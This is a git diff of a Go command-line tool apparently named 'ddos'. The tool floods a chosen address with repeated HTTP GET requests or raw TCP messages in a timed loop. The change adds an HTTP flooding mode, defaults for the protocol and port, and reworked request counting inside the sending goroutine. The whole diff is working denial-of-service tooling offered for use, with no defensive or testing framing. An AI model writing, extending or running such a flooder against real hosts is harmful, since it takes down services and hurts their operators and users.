@@ -6,6 +6,7 @@ import (
 	"github.com/Streamer272/ddos/options"
 	"io/ioutil"
 	"net"
+	"net/http"
 	"os"
 	"os/signal"
 	"strings"
@@ -13,28 +14,27 @@ import (
 	"time"
 )
 
-const (
-	HttpMessage   = "GET / HTTP/1.1\n"
-	SocketMessage = "abcdefghijklmnopqrstuvwxyz1234567890"
-)
-
 func ddos(opt options.Options) error {
+	// http
+	if opt.Http {
+		_, err := http.Get(opt.Address)
+		if err != nil {
+			return err
+		}
+
+		return nil
+	}
+
+	// socket
 	conn, err := net.Dial("tcp", opt.Address)
 	if err != nil {
 		return err
 	}
-
-	defer conn.Close()
-
 	message := ""
 	if opt.Message != "" {
 		message = opt.Message
 	} else {
-		if opt.Http {
-			message = HttpMessage
-		} else {
-			message = SocketMessage
-		}
+		message = "abcdefghijklmnopqrstuvwxyz1234567890"
 	}
 	_, err = fmt.Fprintf(conn, "%v\n", message)
 	if err != nil {
@@ -49,6 +49,23 @@ func main() {
 	log := logger.NewLogger(opt)
 	currentRetryCount := 0
 	currentRequestCount := 0
+
+	// warnings
+	if opt.Delay <= 0 {
+		log.Log("WARN", "Undefined delay may cause system to lag...", true)
+	}
+	if opt.OutputFile != "" && !strings.HasSuffix(opt.OutputFile, ".log") {
+		outputFileSplit := strings.Split(opt.OutputFile, ".")
+		log.Log("WARN", fmt.Sprintf("Recommended extension for output file is .log, has .%v...", outputFileSplit[len(outputFileSplit)-1]), true)
+	}
+	if opt.Http && !strings.HasPrefix(opt.Address, "http") {
+		log.Log("WARN", fmt.Sprintf("%v does not have protocol, using https://", opt.Address), true)
+		opt.Address = "https://" + opt.Address
+	}
+	if !strings.Contains(opt.Address, ":") {
+		log.Log("WARN", fmt.Sprintf("%v does not contain port, using 80...", opt.Address), true)
+		opt.Address = opt.Address + ":80"
+	}
 
 	// errors
 	err := ddos(opt)
@@ -68,15 +85,6 @@ func main() {
 				os.Exit(1)
 			}
 		}
-	}
-
-	// warnings
-	if opt.Delay <= 0 {
-		log.Log("WARN", "Undefined delay may cause system to lag...", true)
-	}
-	if opt.OutputFile != "" && !strings.HasSuffix(opt.OutputFile, ".log") {
-		outputFileSplit := strings.Split(opt.OutputFile, ".")
-		log.Log("WARN", fmt.Sprintf("Recommended extension for output file is .log, has .%v...", outputFileSplit[len(outputFileSplit)-1]), true)
 	}
 
 	time.Sleep(time.Second)
@@ -102,14 +110,15 @@ func main() {
 				} else {
 					log.Log("INFO", fmt.Sprintf("Successfully send packet to %v...", opt.Address), true)
 				}
-			}()
 
-			if opt.RequestCount > 0 {
-				currentRequestCount++
-				if currentRequestCount >= opt.RequestCount {
-					exitMessage <- fmt.Sprintf("Request count reached (%v), exiting...", opt.RequestCount)
+				if opt.RequestCount > 0 {
+					currentRequestCount++
+
+					if currentRequestCount >= opt.RequestCount {
+						exitMessage <- fmt.Sprintf("Request count reached (%v), exiting...", opt.RequestCount)
+					}
 				}
-			}
+			}()
 
 			time.Sleep(time.Millisecond * time.Duration(opt.Delay))
 		}
